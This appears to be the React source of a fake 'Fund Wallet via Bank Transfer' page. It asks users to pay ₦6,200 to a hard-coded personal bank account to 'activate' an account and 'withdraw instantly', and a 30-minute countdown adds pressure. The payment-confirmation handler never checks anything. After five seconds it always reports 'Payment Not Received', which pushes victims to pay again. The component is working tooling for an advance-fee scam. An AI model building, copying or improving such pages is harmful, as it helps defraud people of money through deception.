import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Copy, Wallet, User2, Banknote } from "lucide-react";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import { useAuth } from "@/contexts/AuthContext";
import {
  Dialog,
  DialogContent,
} from "@/components/ui/dialog";
import OpayWarningModal from "@/components/OpayWarningModal";

const BankTransferPayment: React.FC = () => {
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(true);
  const { user } = useAuth();
  const [timeLeft, setTimeLeft] = useState(1800); // 30 mins in seconds
  const [showProcessingDialog, setShowProcessingDialog] = useState(false);
  const [showFailureDialog, setShowFailureDialog] = useState(false);
  const [showOpayWarning, setShowOpayWarning] = useState(true);
  const [buttonText, setButtonText] = useState("I Have Made Payment");
  
  const accountDetails = {
    bankName: "FCMB Bank",
    accountNumber: "1030512463",
    accountName: "SAMUEL JUDE",
    amount: "₦6,200"
  };
  
  // Load account details with delay
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);
    
    return () => clearTimeout(timer);
  }, []);

  // Countdown timer
  useEffect(() => {
    if (!isLoading && timeLeft > 0) {
      const countdownTimer = setInterval(() => {
        setTimeLeft(prev => prev - 1);
      }, 1000);
      
      return () => clearInterval(countdownTimer);
    }
  }, [isLoading, timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins} mins ${secs} secs`;
  };

  const handleBack = () => {
    navigate(-1);
  };

  const handleCopyClick = (text: string, label: string) => {
    navigator.clipboard.writeText(text)
      .then(() => {
        toast.success(`${label} copied!`);
      })
      .catch(() => {
        toast.error("Failed to copy");
      });
  };

  const handlePaymentConfirmation = () => {
    // Show processing dialog
    setShowProcessingDialog(true);
    setButtonText("Pending....");
    
    // After 5 seconds, hide processing dialog and show failure dialog
    setTimeout(() => {
      setShowProcessingDialog(false);
      setShowFailureDialog(true);
    }, 5000);
  };

  const handleTryAgain = () => {
    setShowFailureDialog(false);
    setButtonText("I Have Made Payment");
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Opay Warning Modal */}
      <OpayWarningModal 
        isOpen={showOpayWarning} 
        onClose={() => setShowOpayWarning(false)} 
      />

      {/* Header - Slightly smaller */}
      <div className="flex items-center p-2 border-b">
        <button onClick={handleBack} className="mr-2">
          <ArrowLeft size={16} className="text-green-800" />
        </button>
        <h1 className="text-sm font-medium text-gray-800">Bank Transfer</h1>
      </div>

      <div className="p-3 max-w-sm mx-auto">
        {isLoading ? (
          <div className="flex flex-col items-center justify-center h-48">
            <div className="w-10 h-10 border-3 border-green-800 border-t-transparent rounded-full animate-spin mb-3"></div>
            <p className="text-sm text-gray-600">Loading account details...</p>
          </div>
        ) : (
          <>
            <div className="mb-4">
              <h2 className="text-lg font-bold">Fund Wallet via Bank Transfer</h2>
              <p className="text-gray-500 text-xs mt-1">
                Transfer To This Account Below Within 30mins And Get Activation Code Once Your Payment Got Confirmed
              </p>
            </div>
            
            <div className="bg-gray-50 rounded-lg overflow-hidden text-sm">
              <div className="p-3 flex justify-between items-center">
                <div className="flex-1">
                  <div className="flex items-center">
                    <div className="bg-gray-100 p-1.5 rounded-md mr-3">
                      <Banknote size={20} className="text-green-800" />
                    </div>
                    <div>
                      <p className="text-gray-500 text-xs">Bank Name</p>
                      <p className="font-bold text-green-800 text-sm">{accountDetails.bankName}</p>
                    </div>
                  </div>
                </div>
                <div className="flex items-center text-blue-600">
                  <span className="bg-green-100 px-2 py-0.5 rounded-md text-green-600 text-xs">Active</span>
                </div>
              </div>
              
              <div className="border-t p-3 flex justify-between items-center">
                <div className="flex items-center">
                  <div className="bg-gray-200 p-1.5 rounded-md mr-3 w-7 h-7 flex items-center justify-center">
                    <span className="font-mono text-xs">123</span>
                  </div>
                  <div>
                    <p className="text-gray-500 text-xs">Account Number</p>
                    <p className="font-bold text-gray-800 text-sm">{accountDetails.accountNumber}</p>
                  </div>
                </div>
                <Button 
                  variant="outline" 
                  size="sm"
                  className="bg-green-800 text-white hover:bg-green-700 text-xs px-2 py-1 h-7"
                  onClick={() => handleCopyClick(accountDetails.accountNumber, "Account number")}
                >
                  <Copy size={14} className="mr-1" /> Copy
                </Button>
              </div>
              
              <div className="border-t p-3 flex justify-between items-center">
                <div className="flex items-center">
                  <div className="bg-gray-200 p-1.5 rounded-md mr-3 w-7 h-7 flex items-center justify-center">
                    <User2 size={16} className="text-gray-600" />
                  </div>
                  <div>
                    <p className="text-gray-500 text-xs">Account Name</p>
                    <p className="font-bold text-gray-800 text-sm">{accountDetails.accountName}</p>
                  </div>
                </div>
              </div>
              
              <div className="border-t p-3 flex justify-between items-center">
                <div className="flex items-center">
                  <div className="bg-gray-200 p-1.5 rounded-md mr-3 w-7 h-7 flex items-center justify-center">
                    <Wallet size={16} className="text-blue-600" />
                  </div>
                  <div>
                    <p className="text-gray-500 text-xs">Amount</p>
                    <p className="font-bold text-green-800 text-sm">{accountDetails.amount}</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="mt-4 bg-gray-100 p-3 rounded-lg">
              <p className="text-gray-700 text-xs">
                Hi, {user?.firstName || "James"}
              </p>
              <p className="text-gray-700 text-xs mt-1">
                Make A One Time Payment In Bank Details Above To Activate Your Account And Withdraw Instantly
              </p>
            </div>
              
            <div className="p-2 text-center text-green-800 text-xs mt-3">
              <p>this one-time account expires in {formatTime(timeLeft)}</p>
            </div>

            <button
              onClick={handlePaymentConfirmation}
              className="w-full bg-green-800 text-white py-2 rounded-lg mt-3 text-sm font-medium"
              disabled={showProcessingDialog}
            >
              {buttonText}
            </button>
          </>
        )}
      </div>

      {/* Processing Dialog */}
      <Dialog open={showProcessingDialog} onOpenChange={setShowProcessingDialog}>
        <DialogContent className="sm:max-w-md p-0 gap-0">
          <div className="p-6">
            <h2 className="text-xl font-bold text-center mb-6">Payment Processing</h2>
            <div className="flex items-center justify-center">
              <div className="w-2 h-2 bg-green-800 rounded-full mr-1 animate-pulse"></div>
              <p className="text-gray-500">Checking For Payment</p>
            </div>
          </div>
        </DialogContent>
      </Dialog>
      
      {/* Payment Failure Dialog */}
      <Dialog open={showFailureDialog} onOpenChange={setShowFailureDialog}>
        <DialogContent className="sm:max-w-md p-0 gap-0">
          <div className="p-6">
            <div className="flex flex-col items-center mb-4">
              <div className="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mb-4">
                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 5C8.13401 5 5 8.13401 5 12C5 15.866 8.13401 19 12 19C15.866 19 19 15.866 19 12C19 8.13401 15.866 5 12 5Z" stroke="#6A37FF" strokeWidth="2" />
                  <path d="M9 12L15 12" stroke="#6A37FF" strokeWidth="2" strokeLinecap="round" />
                </svg>
              </div>
              <h2 className="text-xl font-bold text-center">Payment Not Received</h2>
              <h2 className="text-xl font-bold text-center">Please Try Again</h2>
            </div>
            <p className="text-center mb-6">Invalid Payment Please Try Again</p>
            <button
              onClick={handleTryAgain}
              className="w-full bg-white text-green-800 py-2 border border-green-800 font-bold rounded-md"
            >
              TRY AGAIN
            </button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default BankTransferPayment;
